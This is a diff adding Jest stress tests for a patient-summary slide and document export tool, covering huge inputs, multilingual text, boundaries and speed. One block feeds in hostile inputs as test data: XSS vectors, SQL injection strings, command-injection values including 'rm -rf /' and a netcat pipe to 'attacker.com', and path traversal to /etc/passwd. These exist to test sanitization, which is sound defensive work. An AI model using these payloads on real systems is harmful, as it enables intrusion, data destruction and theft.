@@ -766,8 +766,530 @@ describe('Edge Cases', () => {
 
     it('should throw error if PptxGenJS not provided', () => {
       const data = { ageSex: '70M', initials: 'MN' };
-      
+
       expect(() => generateProfessionalPPT(data, null)).toThrow('PptxGenJS library is required');
+    });
+  });
+
+  describe('ENHANCED STRESS TESTS - Data Volume & Performance', () => {
+    it('should handle extremely large AI responses (100K characters)', () => {
+      const data = {
+        ageSex: '85F',
+        initials: 'XL',
+        aiResponse: 'A'.repeat(100000) // 100KB of text
+      };
+
+      const slides = createSlideData(data);
+
+      // Should create base slides + multiple overflow slides
+      expect(slides.length).toBeGreaterThan(15);
+      const overflowSlides = slides.filter(s => s.type === 'overflow');
+      expect(overflowSlides.length).toBeGreaterThan(0);
+    });
+
+    it('should handle extremely large HPI (50K characters)', () => {
+      const data = {
+        ageSex: '90M',
+        hpi: 'B'.repeat(50000) // 50KB HPI
+      };
+
+      // Should not throw, should truncate appropriately
+      expect(() => createSlideData(data)).not.toThrow();
+      const slides = createSlideData(data);
+      expect(slides).toBeDefined();
+      expect(slides.length).toBeGreaterThanOrEqual(15);
+    });
+
+    it('should handle extremely large medication list (20K characters)', () => {
+      const data = {
+        ageSex: '78F',
+        meds: 'Aspirin 81mg, '.repeat(1000) + 'Metformin 500mg' // ~20KB
+      };
+
+      expect(() => createSlideData(data)).not.toThrow();
+      expect(() => exportDOC(data)).not.toThrow();
+    });
+
+    it('should handle all fields at maximum size simultaneously', () => {
+      const data = {
+        ageSex: '101F',
+        initials: 'ST',
+        hpi: 'C'.repeat(50000),
+        meds: 'D'.repeat(20000),
+        aiResponse: 'E'.repeat(100000)
+      };
+
+      const startTime = Date.now();
+      const slides = createSlideData(data);
+      const duration = Date.now() - startTime;
+
+      expect(slides).toBeDefined();
+      expect(slides.length).toBeGreaterThan(15);
+      // Performance check: should complete within reasonable time
+      expect(duration).toBeLessThan(5000); // 5 seconds max
+    });
+
+    it('should handle multiple overflow slides (500K character response)', () => {
+      const data = {
+        ageSex: '85F',
+        aiResponse: 'X'.repeat(500000) // 500KB
+      };
+
+      const slides = createSlideData(data);
+      const overflowSlides = slides.filter(s => s.type === 'overflow');
+
+      // With 700 char threshold, should create many overflow slides
+      expect(overflowSlides.length).toBeGreaterThan(50);
+      expect(slides.length).toBeGreaterThan(65); // 15 base + many overflow
+    });
+
+    it('should handle sanitization of massive text with control characters', () => {
+      const controlChars = '\x00\x01\x02\x03\x04\x05\x06\x07\x08\x0B\x0C\x0E\x0F';
+      const largeText = ('Text' + controlChars).repeat(5000); // ~100KB with control chars
+
+      const sanitized = sanitizeText(largeText);
+
+      expect(sanitized).toBeDefined();
+      expect(sanitized.length).toBeGreaterThan(0);
+      // Should remove all control characters
+      expect(sanitized).not.toMatch(/[\x00-\x08\x0B\x0C\x0E-\x1F]/);
+    });
+
+    it('should handle massive HTML escaping (100K characters)', () => {
+      const htmlText = '<script>alert("xss")</script>&lt;&gt;&quot;'.repeat(2000);
+
+      const escaped = escapeHtml(htmlText);
+
+      expect(escaped).toBeDefined();
+      expect(escaped).not.toContain('<script>');
+      expect(escaped).toContain('&lt;');
+      expect(escaped).toContain('&gt;');
+      expect(escaped).toContain('&quot;');
+    });
+
+    it('should handle truncation of extremely long text efficiently', () => {
+      const veryLongText = 'A'.repeat(1000000); // 1MB
+
+      const startTime = Date.now();
+      const truncated = truncateText(veryLongText, 1000);
+      const duration = Date.now() - startTime;
+
+      expect(truncated.length).toBe(1000);
+      expect(truncated).toContain('...');
+      expect(duration).toBeLessThan(100); // Should be very fast
+    });
+  });
+
+  describe('ENHANCED STRESS TESTS - Unicode & International', () => {
+    it('should handle mixed RTL and LTR text (Hebrew, Arabic, English)', () => {
+      const data = {
+        ageSex: '75F',
+        hpi: 'Patient שלום with مرحبا symptoms and English text',
+        meds: 'תרופות: Aspirin دواء 81mg',
+        aiResponse: 'Mixed text: שלום עולם مرحبا بك Hello World'
+      };
+
+      const html = createDocHTML(data);
+      expect(html).toContain('שלום');
+      expect(html).toContain('مرحبا');
+      expect(html).toContain('Hello');
+
+      const slides = createSlideData(data);
+      expect(slides).toBeDefined();
+    });
+
+    it('should handle emoji and special Unicode characters', () => {
+      const data = {
+        ageSex: '80M',
+        hpi: 'Patient 😊 presents with pain 🤕 and fever 🤒',
+        meds: 'Medicine ♥️ 💊 tablets',
+        aiResponse: 'Assessment ✓ completed ✗ incomplete'
+      };
+
+      const sanitized = sanitizeText(data.hpi);
+      expect(sanitized).toContain('😊');
+      expect(sanitized).toContain('🤕');
+
+      const html = createDocHTML(data);
+      expect(html).toContain('💊');
+    });
+
+    it('should handle Chinese, Japanese, Korean characters', () => {
+      const data = {
+        ageSex: '85F',
+        hpi: '患者 (Chinese) 患者 (Japanese: かんじゃ) 환자 (Korean)',
+        meds: '薬 medicine 약',
+        aiResponse: '診断: Diagnosis 진단'
+      };
+
+      const html = createDocHTML(data);
+      expect(html).toContain('患者');
+      expect(html).toContain('かんじゃ');
+      expect(html).toContain('환자');
+
+      const sanitized = sanitizeText(data.meds);
+      expect(sanitized).toContain('薬');
+      expect(sanitized).toContain('약');
+    });
+
+    it('should handle combining diacritical marks', () => {
+      const data = {
+        ageSex: '70F',
+        hpi: 'Café, naïve, résumé, Zürich, São Paulo',
+        meds: 'Paracétamol, Ibuprofen™'
+      };
+
+      const sanitized = sanitizeText(data.hpi);
+      expect(sanitized).toContain('Café');
+      expect(sanitized).toContain('naïve');
+      expect(sanitized).toContain('Zürich');
+      expect(sanitized).toContain('São');
+    });
+
+    it('should handle zero-width characters and invisible Unicode', () => {
+      const data = {
+        ageSex: '85F',
+        hpi: 'Text\u200B\u200C\u200D\uFEFFwith invisible chars'
+      };
+
+      const sanitized = sanitizeText(data.hpi);
+      expect(sanitized).toBeDefined();
+      // Zero-width chars may or may not be preserved, but should not break
+      expect(() => createDocHTML(data)).not.toThrow();
+    });
+  });
+
+  describe('ENHANCED STRESS TESTS - Boundary Conditions', () => {
+    it('should handle text exactly at maxTextPerSlide (1000 chars)', () => {
+      const data = {
+        ageSex: '85F',
+        aiResponse: 'A'.repeat(1000) // Exactly 1000
+      };
+
+      const slides = createSlideData(data);
+      expect(slides).toBeDefined();
+      // Should not create overflow for exactly 1000 chars
+      const overflowSlides = slides.filter(s => s.type === 'overflow');
+      expect(overflowSlides.length).toBe(0);
+    });
+
+    it('should handle text at maxTextPerSlide + 1 (1001 chars)', () => {
+      const data = {
+        ageSex: '85F',
+        aiResponse: 'A'.repeat(1001) // Just over limit
+      };
+
+      const slides = createSlideData(data);
+      const overflowSlides = slides.filter(s => s.type === 'overflow');
+      expect(overflowSlides.length).toBeGreaterThan(0);
+    });
+
+    it('should handle single character in each field', () => {
+      const data = {
+        ageSex: 'F',
+        initials: 'A',
+        hpi: 'X',
+        meds: 'Y',
+        aiResponse: 'Z'
+      };
+
+      expect(() => createSlideData(data)).not.toThrow();
+      expect(() => exportDOC(data)).not.toThrow();
+    });
+
+    it('should handle maximum initials length', () => {
+      const data = {
+        initials: 'ABCDEFGHIJ' // 10 characters
+      };
+
+      const result = exportDOC(data);
+      expect(result.filename).toContain('ABCDEFGHIJ');
+    });
+
+    it('should handle age boundary conditions', () => {
+      const testCases = ['0F', '1M', '99F', '100M', '150F', '999M'];
+
+      testCases.forEach(ageSex => {
+        const data = { ageSex };
+        expect(() => createSlideData(data)).not.toThrow();
+        expect(() => exportDOC(data)).not.toThrow();
+      });
+    });
+
+    it('should handle null vs undefined vs empty string consistently', () => {
+      const testCases = [
+        { ageSex: null },
+        { ageSex: undefined },
+        { ageSex: '' },
+        { hpi: null },
+        { hpi: undefined },
+        { hpi: '' }
+      ];
+
+      testCases.forEach(data => {
+        expect(() => createSlideData(data)).not.toThrow();
+        expect(() => exportDOC(data)).not.toThrow();
+      });
+    });
+  });
+
+  describe('ENHANCED STRESS TESTS - Malicious Input & XSS', () => {
+    it('should handle deeply nested HTML tags (100 levels)', () => {
+      let nestedHTML = 'content';
+      for (let i = 0; i < 100; i++) {
+        nestedHTML = `<div>${nestedHTML}</div>`;
+      }
+
+      const data = {
+        ageSex: '85F',
+        hpi: nestedHTML
+      };
+
+      const sanitized = sanitizeText(data.hpi);
+      expect(sanitized).toBe('content');
+      expect(sanitized).not.toContain('<div>');
+    });
+
+    it('should handle multiple XSS attack vectors', () => {
+      const xssVectors = [
+        '<script>alert(1)</script>',
+        '<img src=x onerror=alert(1)>',
+        '<svg onload=alert(1)>',
+        'javascript:alert(1)',
+        '<iframe src="javascript:alert(1)">',
+        '<object data="javascript:alert(1)">',
+        '<embed src="javascript:alert(1)">',
+        '<a href="javascript:alert(1)">click</a>',
+        '<form action="javascript:alert(1)">',
+        '<input onfocus=alert(1) autofocus>'
+      ];
+
+      xssVectors.forEach(xss => {
+        const sanitized = sanitizeText(xss);
+        expect(sanitized).not.toContain('<script');
+        expect(sanitized).not.toContain('<img');
+        expect(sanitized).not.toContain('<svg');
+        expect(sanitized).not.toContain('<iframe');
+        expect(sanitized).not.toContain('<object');
+        expect(sanitized).not.toContain('<embed');
+
+        const escaped = escapeHtml(xss);
+        expect(escaped).toContain('&lt;');
+        expect(escaped).toContain('&gt;');
+      });
+    });
+
+    it('should handle SQL injection-like strings', () => {
+      const data = {
+        ageSex: "85F'; DROP TABLE patients; --",
+        hpi: "' OR '1'='1",
+        meds: "admin'--",
+        aiResponse: "1'; DELETE FROM records WHERE '1'='1"
+      };
+
+      // Should not throw, should escape/sanitize properly
+      expect(() => createDocHTML(data)).not.toThrow();
+      expect(() => createSlideData(data)).not.toThrow();
+
+      const html = createDocHTML(data);
+      const escaped = escapeHtml(data.ageSex);
+      expect(escaped).toContain('&#39;');
+    });
+
+    it('should handle command injection attempts', () => {
+      const data = {
+        ageSex: '85F; rm -rf /',
+        hpi: '$(whoami)',
+        meds: '`cat /etc/passwd`',
+        aiResponse: '| nc attacker.com 1234'
+      };
+
+      expect(() => createDocHTML(data)).not.toThrow();
+      expect(() => createSlideData(data)).not.toThrow();
+
+      const sanitized = sanitizeText(data.hpi);
+      expect(sanitized).toBeDefined();
+    });
+
+    it('should handle path traversal attempts', () => {
+      const data = {
+        initials: '../../../etc/passwd',
+        hpi: '..\\..\\..\\windows\\system32',
+        meds: '/etc/shadow'
+      };
+
+      expect(() => exportDOC(data)).not.toThrow();
+      const result = exportDOC(data);
+      expect(result.filename).toBeDefined();
+    });
+  });
+
+  describe('ENHANCED STRESS TESTS - Special Characters & Encoding', () => {
+    it('should handle all control characters (0x00-0x1F)', () => {
+      const controlChars = Array.from({ length: 32 }, (_, i) => String.fromCharCode(i)).join('');
+      const data = {
+        ageSex: '85F',
+        hpi: 'Text' + controlChars + 'More text'
+      };
+
+      const sanitized = sanitizeText(data.hpi);
+      // Should remove control chars except \n and \t
+      expect(sanitized).not.toMatch(/[\x00-\x08\x0B\x0C\x0E-\x1F]/);
+      expect(sanitized).toContain('Text');
+      expect(sanitized).toContain('More text');
+    });
+
+    it('should handle all HTML special characters', () => {
+      const data = {
+        ageSex: '85F',
+        hpi: '< > & " \' / = ` ~ ! @ # $ % ^ * ( ) [ ] { } | \\ ; : , . ? + -'
+      };
+
+      const escaped = escapeHtml(data.hpi);
+      expect(escaped).toContain('&lt;');
+      expect(escaped).toContain('&gt;');
+      expect(escaped).toContain('&amp;');
+      expect(escaped).toContain('&quot;');
+      expect(escaped).toContain('&#39;');
+    });
+
+    it('should handle repeated escape sequences', () => {
+      const data = {
+        hpi: '&amp;&amp;&amp;&lt;&lt;&lt;&gt;&gt;&gt;'.repeat(100)
+      };
+
+      const sanitized = sanitizeText(data.hpi);
+      expect(sanitized).toBeDefined();
+      expect(sanitized.length).toBeGreaterThan(0);
+    });
+
+    it('should handle mixed newline types (CR, LF, CRLF)', () => {
+      const data = {
+        hpi: 'Line1\nLine2\rLine3\r\nLine4',
+        meds: 'Med1\nMed2\rMed3\r\nMed4'
+      };
+
+      const sanitized = sanitizeText(data.hpi);
+      expect(sanitized).toContain('Line1');
+      expect(sanitized).toContain('Line4');
+
+      const html = createDocHTML(data);
+      expect(html).toBeDefined();
+    });
+
+    it('should handle excessive whitespace variations', () => {
+      const data = {
+        hpi: '  Multiple   spaces\t\ttabs\n\n\nnewlines      everywhere  ',
+        meds: '\t\t\tTabs\n\n\n\nNewlines    Spaces'
+      };
+
+      const sanitized = sanitizeText(data.hpi);
+      expect(sanitized).toBeDefined();
+      expect(sanitized).toContain('Multiple');
+    });
+  });
+
+  describe('ENHANCED STRESS TESTS - Performance & Memory', () => {
+    it('should handle rapid successive exports (100 iterations)', () => {
+      const data = {
+        ageSex: '85F',
+        initials: 'RP',
+        hpi: 'Standard patient data',
+        meds: 'Aspirin 81mg',
+        aiResponse: 'Assessment complete'
+      };
+
+      const startTime = Date.now();
+
+      for (let i = 0; i < 100; i++) {
+        const result = exportDOC(data);
+        expect(result.blob).toBeDefined();
+        expect(result.filename).toBeDefined();
+      }
+
+      const duration = Date.now() - startTime;
+      expect(duration).toBeLessThan(10000); // Should complete in under 10 seconds
+    });
+
+    it('should handle creating many slides efficiently', () => {
+      const data = {
+        ageSex: '85F',
+        aiResponse: 'X'.repeat(100000) // Should create many overflow slides
+      };
+
+      const startTime = Date.now();
+      const slides = createSlideData(data);
+      const duration = Date.now() - startTime;
+
+      expect(slides.length).toBeGreaterThan(50);
+      expect(duration).toBeLessThan(2000); // Should be fast even with many slides
+    });
+
+    it('should handle repeated sanitization calls efficiently (10000 iterations)', () => {
+      const text = '<p>Sample text with HTML</p>';
+
+      const startTime = Date.now();
+
+      for (let i = 0; i < 10000; i++) {
+        sanitizeText(text);
+      }
+
+      const duration = Date.now() - startTime;
+      expect(duration).toBeLessThan(1000); // Should be very fast
+    });
+
+    it('should handle memory-intensive escaping (1MB text)', () => {
+      const largeText = '&<>"\' '.repeat(200000); // ~1MB
+
+      const startTime = Date.now();
+      const escaped = escapeHtml(largeText);
+      const duration = Date.now() - startTime;
+
+      expect(escaped).toBeDefined();
+      expect(escaped.length).toBeGreaterThan(largeText.length); // Should be longer due to escaping
+      expect(duration).toBeLessThan(3000); // Should complete in reasonable time
+    });
+  });
+
+  describe('ENHANCED STRESS TESTS - Combined Edge Cases', () => {
+    it('should handle all edge cases simultaneously', () => {
+      const data = {
+        ageSex: '150F; DROP TABLE;', // Unusual age + SQL injection
+        initials: '../../../etc', // Path traversal
+        hpi: '<script>alert("xss")</script>'.repeat(1000) + '\x00\x01\x02' + '😊🤕🤒' + 'שלום עולם', // XSS + control chars + emoji + Hebrew
+        meds: '&'.repeat(10000), // Massive escaping needed
+        aiResponse: 'A'.repeat(100000) + '<img src=x>' // Large text + XSS
+      };
+
+      // Should handle everything without throwing
+      expect(() => createSlideData(data)).not.toThrow();
+      expect(() => exportDOC(data)).not.toThrow();
+      expect(() => sanitizeText(data.hpi)).not.toThrow();
+      expect(() => escapeHtml(data.meds)).not.toThrow();
+
+      const slides = createSlideData(data);
+      expect(slides).toBeDefined();
+      expect(slides.length).toBeGreaterThan(15);
+
+      const result = exportDOC(data);
+      expect(result.blob).toBeDefined();
+      expect(result.html).toBeDefined();
+    });
+
+    it('should handle alternating valid and invalid data patterns', () => {
+      const testData = [
+        { ageSex: '85F', hpi: 'Normal' },
+        { ageSex: null, hpi: undefined },
+        { ageSex: '<script>', hpi: '$(whoami)' },
+        { ageSex: '', hpi: '' },
+        { ageSex: '999X', hpi: 'A'.repeat(100000) },
+        { ageSex: '😊', hpi: 'שלום' }
+      ];
+
+      testData.forEach(data => {
+        expect(() => createSlideData(data)).not.toThrow();
+        expect(() => exportDOC(data)).not.toThrow();
+      });
     });
   });
 });
